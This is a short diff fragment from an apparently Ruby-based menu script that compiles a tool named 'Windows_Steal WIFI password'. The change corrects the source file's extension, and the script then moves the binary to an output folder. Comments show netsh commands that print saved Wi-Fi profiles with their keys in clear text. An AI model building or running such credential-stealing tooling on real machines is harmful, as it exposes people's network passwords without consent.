@@ -52,7 +52,7 @@ while true
                 puts 'Loading...'
                 # netsh wlan show profile
                 # netsh wlan show profile WiFi-name key=clear
-                system('g++ Windows/Windows_Steal\ WIFI\ password.c')
+                system('g++ Windows/Windows_Steal\ WIFI\ password.cpp')
                 system('mv a.out Windows_s.out')
                 system('chmod +x Windows_s.out')
                 system('mv Windows_s.out Out/')
